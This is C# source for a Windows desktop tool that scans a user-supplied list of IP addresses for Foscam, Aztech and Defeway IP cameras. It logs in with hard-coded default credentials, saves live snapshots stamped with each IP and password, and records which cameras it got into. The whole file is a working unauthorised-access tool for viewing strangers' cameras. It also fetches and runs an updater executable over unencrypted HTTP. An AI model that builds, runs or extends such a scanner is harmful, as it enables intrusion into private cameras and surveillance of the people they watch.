using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ipcam_winforms
{
    public partial class mainUI : Form
    {
        //camera login information
        public string foscamlocation = "/snapshot.cgi";
        public string sineojilocation = "/tmpfs/auto.jpg";
        public string defewaylocation = "/cgi-bin/snapshot.cgi?chn=1&u=admin&p=";

        public NetworkCredential foscamCreds = new NetworkCredential("admin", "");
        public NetworkCredential sineojiCreds = new NetworkCredential("user", "user");
        public NetworkCredential defewayCreds = new NetworkCredential("admin", "");

        public string[] foscamCredsPlain = { "admin", "" };
        public string[] sineojiCredsPlain = { "user", "user" };
        public string[] defewayCredsPlain = { "admin", "" };

        public NetworkCredential currentCreds;
        public string[] currentCredsPlain;

        //user files information
        public string inputSafeFileName;
        public string inputFileName;
        public string outputSafeFileName;
        public string outputFileName;
        public string passlistSafeFileName;
        public string passlistFileName;

        public bool discardWorkingOutput;
        public bool userOpenedInputFile;
        public bool userOpenedOutputFile;

        public int filelengh;
        public int elapsedmseconds;
        public string[] lines;

        public string exepath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\img\";

        //empty variables
        public List<String> workingIPs = new List<String> { };
        public string[] passlines;
        public int timerpauser = 0;
        public string selectedDirectory = "";
        public string currentip = "";

        public string shiftreg0 = "";
        public string shiftreg1 = "";
        public string shiftreg2 = "";
        public string shiftreg3 = "";
        public string shiftreg4 = "";
        public string shiftreg5 = "";

        public string shiftreg0ip = "";
        public string shiftreg1ip = "";
        public string shiftreg2ip = "";
        public string shiftreg3ip = "";
        public string shiftreg4ip = "";
        public string shiftreg5ip = "";

        //other
        public bool usingPasslist = false;
        public bool pause = false;
        public int ID = 0;
        public int httpResponseTimer = 0;
        public string oldest = "";
        public string lastlocation = "";
        public int counter;
        public ManualResetEvent mrse = new ManualResetEvent(true);


    public mainUI()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Input File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    userOpenedInputFile = true;
                    inputSafeFileName = dlg.SafeFileName;
                    inputFileName = dlg.FileName;
                    lines = System.IO.File.ReadAllLines(inputFileName);
                    filelengh = lines.Count();
                    label6.Text = ("Tested: " + counter);
                    label5.Text = "IPs: " + filelengh;
                    inputBttn.ForeColor = Color.DarkGreen;
                    label8.Text = inputSafeFileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open Output File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    userOpenedOutputFile = true;
                    string SafeFileName = Path.GetFileName(dlg.FileName);
                    outputSafeFileName = SafeFileName;
                    outputFileName = dlg.FileName;
                    outputBttn.ForeColor = Color.DarkGreen;
                    label7.Text = outputSafeFileName;
                }
            }
        }

        public class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 5000;
                return req;
            }
        }

        public static int GetNextInt32(RNGCryptoServiceProvider rnd)
        {
            byte[] randomInt = new byte[4];
            rnd.GetBytes(randomInt);
            return Convert.ToInt32(randomInt[0]);
        }

        public bool isUserAnIdiot()
        {
            if(userOpenedInputFile == false)
            {
                return true;
            }
            if(userOpenedOutputFile == false)
            {
                return true;
            }

            return false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (isUserAnIdiot())
            {
                Form userIdiotNotifier = new userIdiotNotifier();
                userIdiotNotifier.Show();
                return;
            }

            timer1.Start();

            button6.Enabled = true;

            if (foscamRadioBttn.Checked)
            {
                button8.Enabled = true;
            }
            if (aztechRadioBttn.Checked)
            {
                button8.Enabled = true;
            }

            if (selectedDirectory == "")
            {
                selectedDirectory = exepath;
            }
            else
            {
                exepath = selectedDirectory;
            }

            if (randomIpOrdCheckbox.Checked)
            {
                RNGCryptoServiceProvider rnd2 = new RNGCryptoServiceProvider(); //may be overdoing it a little
                string[] lines2 = lines.OrderBy(x => GetNextInt32(rnd2)).ToArray();
                lines = lines2;
            }

            string[] Ofirstsplit = lines.Take(lines.Length / 2).ToArray();
            string[] Osecondsplit = lines.Skip(lines.Length / 2).ToArray();

            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();


            inputBttn.Enabled = false;
            outputBttn.Enabled = false;
            startBttn.Enabled = false;
            folderBttn.Enabled = false;
            foscamRadioBttn.Enabled = false;
            aztechRadioBttn.Enabled = false;
            threadSelector.Enabled = false;
            defewayRadioBttn.Enabled = false;
            randomIpOrdCheckbox.Enabled = false;
            discardOutputCheck.Enabled = false;

            tabs.SelectedIndex = 1;

            if (foscamRadioBttn.Checked)
            {
                if(threadSelector.Text == "4")
                {
                    Thread a = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 1, firstsplit, foscamlocation, foscamCredsPlain));
                    Thread b = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 2, secondsplit, foscamlocation, foscamCredsPlain));
                    Thread c = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 3, thirdsplit, foscamlocation, foscamCredsPlain));
                    Thread d = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 4, forthsplit, foscamlocation, foscamCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    c.IsBackground = true;
                    d.IsBackground = true;
                    a.Start();
                    b.Start();
                    c.Start();
                    d.Start();
                }
                if(threadSelector.Text == "2")
                {
                    Thread a = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 1, Ofirstsplit, foscamlocation, foscamCredsPlain));
                    Thread b = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 2, Osecondsplit, foscamlocation, foscamCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    a.Start();
                    b.Start();
                }
                if(threadSelector.Text == "1")
                {
                    Thread a = new Thread(() => MainTestThread(foscamCreds, "admin : blank", 1, lines, foscamlocation, foscamCredsPlain));
                    a.IsBackground = true;
                    a.Start();
                }
            }
            if (aztechRadioBttn.Checked)
            {
                if(threadSelector.Text == "4")
                {
                    Thread a = new Thread(() => MainTestThread(sineojiCreds, "user : user", 1, firstsplit, sineojilocation, sineojiCredsPlain));
                    Thread b = new Thread(() => MainTestThread(sineojiCreds, "user : user", 2, secondsplit, sineojilocation, sineojiCredsPlain));
                    Thread c = new Thread(() => MainTestThread(sineojiCreds, "user : user", 3, thirdsplit, sineojilocation, sineojiCredsPlain));
                    Thread d = new Thread(() => MainTestThread(sineojiCreds, "user : user", 4, forthsplit, sineojilocation, sineojiCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    c.IsBackground = true;
                    d.IsBackground = true;
                    a.Start();
                    b.Start();
                    c.Start();
                    d.Start();
                }
                if(threadSelector.Text == "2")
                {
                    Thread a = new Thread(() => MainTestThread(sineojiCreds, "user : user", 1, Ofirstsplit, sineojilocation, sineojiCredsPlain));
                    Thread b = new Thread(() => MainTestThread(sineojiCreds, "user : user", 2, Osecondsplit, sineojilocation, sineojiCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    a.Start();
                    b.Start();
                }
                if(threadSelector.Text == "1")
                {
                    Thread a = new Thread(() => MainTestThread(sineojiCreds, "user : user", 1, lines, sineojilocation, sineojiCredsPlain));
                    a.IsBackground = true;
                    a.Start();
                }
            }
            if (defewayRadioBttn.Checked)
            {
                if (threadSelector.Text == "4")
                {
                    Thread a = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 1, firstsplit, defewaylocation, defewayCredsPlain));
                    Thread b = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 2, secondsplit, defewaylocation, defewayCredsPlain));
                    Thread c = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 3, thirdsplit, defewaylocation, defewayCredsPlain));
                    Thread d = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 4, forthsplit, defewaylocation, defewayCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    c.IsBackground = true;
                    d.IsBackground = true;
                    a.Start();
                    b.Start();
                    c.Start();
                    d.Start();
                }
                if (threadSelector.Text == "2")
                {
                    Thread a = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 1, Ofirstsplit, defewaylocation, defewayCredsPlain));
                    Thread b = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 2, Osecondsplit, defewaylocation, defewayCredsPlain));
                    a.IsBackground = true;
                    b.IsBackground = true;
                    a.Start();
                    b.Start();
                }
                if (threadSelector.Text == "1")
                {
                    Thread a = new Thread(() => MainTestThread(defewayCreds, "admin : blank", 1, lines, defewaylocation, defewayCredsPlain));
                    a.IsBackground = true;
                    a.Start();
                }
            }
        }



        public static Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

                using (var wrapMode = new ImageAttributes())
                {
                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }

            return destImage;
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public void MainTestThread(NetworkCredential credential, string usedcreds, int threadindex, string[] ipinput, string location, string[] credsPlain)
        {
            currentCreds = credential;
            currentCredsPlain = credsPlain;

            Console.WriteLine("thread " + threadindex + " started");
            int i = 0;
            mainUI f1 = new mainUI();
            string linesfile = inputFileName;
            string processed = outputFileName;
            string imgdir = "img";
            string[] lines = ipinput;
            string savedata = "";
            string linex = "";
            var connectedipslist = new List<string>();

            if (!Directory.Exists(imgdir) && selectedDirectory == "")
            {
                Console.WriteLine("creating img directory");
                MessageBox.Show("Creating image directory", "Image directory not found", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Directory.CreateDirectory(imgdir);
            };

            foreach (string line in lines)
            {
                mrse.WaitOne();

                linex = line;
                if (line.EndsWith(":"))
                {
                    linex = line.Remove(line.Length - 1);
                }

                this.Invoke(new MethodInvoker(delegate ()
                {
                    counter++;
                    label6.Text = ("Tested: " + counter);
                }));

                using (MyWebClient client = new MyWebClient())
                {
                    try
                    {

                        httpResponseTimer = 0;

                        i = i + 1;
                        string ran = RandomString(8);

                        string localFilename = (exepath + @"image" + i + ran + ".jpg");
                        string localFilenameEdit = (exepath + "/drawn/" + @"image" + i + "drwn" + ran + ".jpg");
                        string localfilesafe = (@"image" + i + "drwn" + ran + ".jpg");

                        Directory.CreateDirectory(exepath + "/drawn");

                        Console.WriteLine("finished passlist segment");

                        client.Credentials = credential;

                        Stopwatch sw = Stopwatch.StartNew();

                        client.DownloadFile(new Uri("http://" + linex + location), localFilename);

                        sw.Stop();

                        currentip = linex;

                        savedata = savedata + (linex + " saved as " + localFilenameEdit) + "\n";

                        PointF firstLocation = new PointF(10f, 10f);
                        PointF secondLocation = new PointF(10f, 24f);
                        Bitmap bitmap = (Bitmap)Image.FromFile(localFilename);
                        if (bitmap.Width == 320)
                        {
                            Console.WriteLine("changed size");
                            bitmap = ResizeImage(bitmap, bitmap.Width * 4, bitmap.Height * 4);
                        }

                        using (Graphics graphics = Graphics.FromImage(bitmap))
                        {
                            using (Font lucFont = new Font("Lucida Console", 10))
                            {
                                PointF Pointvar = new PointF(10f, 10f);
                                PointF Pointvar2 = new PointF(10f, 24f);
                                SizeF size = graphics.MeasureString(linex, lucFont);
                                SizeF size2 = graphics.MeasureString(currentCredsPlain[0] + " : " + currentCredsPlain[1], lucFont);
                                RectangleF rect = new RectangleF(Pointvar, size);
                                RectangleF rect2 = new RectangleF(Pointvar2, size2);
                                graphics.FillRectangle(Brushes.Black, rect);
                                graphics.FillRectangle(Brushes.Black, rect2);
                                graphics.DrawString(linex, lucFont, Brushes.White, firstLocation);
                                graphics.DrawString(currentCredsPlain[0] + " : " + currentCredsPlain[1], lucFont, Brushes.White, secondLocation);
                            }
                        }

                        bitmap.Save(localFilenameEdit, ImageFormat.Jpeg);
                        Console.WriteLine(linex + " > " + localFilenameEdit);

                        currentip = linex;

                        shiftreg5 = shiftreg4;
                        shiftreg4 = shiftreg3;
                        shiftreg3 = shiftreg2;
                        shiftreg2 = shiftreg1;
                        shiftreg1 = shiftreg0;
                        shiftreg0 = localFilenameEdit;

                        shiftreg5ip = shiftreg4ip;
                        shiftreg4ip = shiftreg3ip;
                        shiftreg3ip = shiftreg2ip;
                        shiftreg2ip = shiftreg1ip;
                        shiftreg1ip = shiftreg0ip;
                        shiftreg0ip = linex;

                        this.Invoke(new MethodInvoker(delegate ()
                        {
                            try { pictureBox2.Image = Bitmap.FromFile(shiftreg1); } catch { Console.WriteLine("failed SR1" + shiftreg1); }
                            try { pictureBox3.Image = Bitmap.FromFile(shiftreg2); } catch { Console.WriteLine("failed SR2" + shiftreg2); }
                            try { pictureBox4.Image = Bitmap.FromFile(shiftreg3); } catch { Console.WriteLine("failed SR3" + shiftreg3); }
                            try { pictureBox5.Image = Bitmap.FromFile(shiftreg4); } catch { Console.WriteLine("failed SR4" + shiftreg3); }
                            try { pictureBox6.Image = Bitmap.FromFile(shiftreg5); } catch { Console.WriteLine("failed SR5" + shiftreg3); }

                            string[] time = sw.Elapsed.TotalMilliseconds.ToString().Split('.');

                            label9.Text = "IP: " + currentip + " RESPONSE: " + time[0] + "ms";
                        }));

                        this.Invoke(new MethodInvoker(delegate ()
                        {

                            listBox1.Items.Insert(0, linex);

                        }));

                        this.Invoke(new MethodInvoker(delegate ()
                        {
                            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                            Bitmap sourceBitmap = new Bitmap(localFilenameEdit);
                            pictureBox1.Image = new Bitmap(sourceBitmap);
                        }));

                        if (!discardWorkingOutput)
                        {
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                workingIPs.Add(linex);
                                System.IO.File.WriteAllText(outputFileName, string.Join("\n", workingIPs));
                            }));
                        }

                        bitmap.Dispose();

                        File.Delete(localFilename);

                    }

                    catch
                    {

                    }
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var form3 = new about();
            form3.Show();
        }

        public bool checkforupdate()
        {
            using (MyWebClient client = new MyWebClient())
            {
                byte[] dat = client.DownloadData("http://knedit.pw/software/updateID");
                string uids = System.Text.Encoding.UTF8.GetString(dat);
                int uid;
                Int32.TryParse(uids, out uid);
                if (uid > ID)
                {
                    return true;
                }
            }

            return false;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            elapsedmseconds++;
            TimeSpan time = TimeSpan.FromMilliseconds(elapsedmseconds * 10);
            string str = time.ToString(@"hh\:mm\:ss");
            label2.Text = "Elapsed: " + str;

            if (counter == filelengh)
            {
                timerpauser++;

                if (timerpauser == 100)
                {
                    timer1.Stop();
                    Form form4 = new processCompleteNotifier(str, outputFileName, discardWorkingOutput);
                    form4.Show();
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                DialogResult result = fbd.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                {
                    selectedDirectory = fbd.SelectedPath + "/";
                    folderBttn.ForeColor = Color.DarkGreen;
                }
            }
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            pause = !pause;

            if (pause == true)
            {
                mrse.Reset();
                button6.ForeColor = Color.Red;
                timer1.Stop();
            }
            if (pause == false)
            {
                mrse.Set();
                button6.ForeColor = Color.Black;
                timer1.Start();
            }
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            if (checkforupdate())
            {
                updatelbl.Text = "UPDATE AVAILABLE";
                updatelbl.ForeColor = Color.Green;
                updatebttn.Enabled = true;
            }

            ToolTip HELPTIP = new ToolTip();
            HELPTIP.ShowAlways = true;
            HELPTIP.SetToolTip(inputBttn, "file containing IP:PORT strings");
            HELPTIP.SetToolTip(outputBttn, "file for saving the working IPs to");
            HELPTIP.SetToolTip(folderBttn, "folder that images from working cameras will be saved to");
            HELPTIP.SetToolTip(randomIpOrdCheckbox, "randomises the order that IPs are tested in");
            HELPTIP.SetToolTip(aztechRadioBttn, "use the path for aztech cameras (IP:PORT/tmpfs/auto.jpg)");
            HELPTIP.SetToolTip(foscamRadioBttn, "use the path for foscam cameras (IP:PORT/snapshot.cgi)");
            HELPTIP.SetToolTip(defewayRadioBttn, "use the path for defeway cameras (IP:PORT/cgi-bin/snapshot.cgi?chn=1&u=admin&p=");
            HELPTIP.SetToolTip(label4, "number of threads to use, 1, 2 or 4. higher takes more bandwidth but is faster");
            HELPTIP.SetToolTip(threadSelector, "number of threads to use, 1, 2 or 4. higher takes more bandwidth but is faster");
            HELPTIP.SetToolTip(startBttn, "begin testing");
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (currentip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(currentip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            if (shiftreg1ip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(shiftreg1ip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (shiftreg2ip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(shiftreg2ip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            if (shiftreg3ip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(shiftreg3ip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            if (shiftreg4ip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(shiftreg4ip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {
            if (shiftreg5ip != "")
            {
                Form INT_BROWSER = new INT_BROWSER(shiftreg5ip, currentCredsPlain);
                INT_BROWSER.Show();
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (aztechRadioBttn.Checked)
            {
                string clocation = "";
                clocation = sineojilocation;
                Form JPG_REQUEST = new JPG_REQUEST(currentip, currentCredsPlain[0], currentCredsPlain[1], clocation);
                JPG_REQUEST.Show();
            }
            if (foscamRadioBttn.Checked)
            {
                string clocation = "";
                clocation = foscamlocation;
                Form JPG_REQUEST_FOSCAM = new JPG_REQUEST_FOSCAM(currentip, currentCredsPlain[0], currentCredsPlain[1], clocation);
                JPG_REQUEST_FOSCAM.Show();
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (discardOutputCheck.Checked)
            {
                discardWorkingOutput = true;
                userOpenedOutputFile = true;
                outputBttn.Enabled = false;
                outputFileName = "[discarded]";
            }
            if (!discardOutputCheck.Checked)
            {
                discardWorkingOutput = false;
                userOpenedOutputFile = false;
                outputBttn.Enabled = true;
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            //download update
            using (MyWebClient client = new MyWebClient())
            {
                if (!File.Exists(Environment.CurrentDirectory + "/updater.exe"))
                {
                    client.DownloadFile(@"http://knedit.pw/software/updater.exe", Environment.CurrentDirectory + "/updater.exe");
                }

                string dfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + "data.txt";
                var f = File.Create(dfile);
                f.Close();
                File.WriteAllText(dfile, Environment.CurrentDirectory + @"\" + System.AppDomain.CurrentDomain.FriendlyName + "," + ID);
                var p = new Process();
                p.StartInfo.FileName = Environment.CurrentDirectory + "/updater.exe";
                p.Start();
                this.Close();
                //update done
            }
        }
    }
}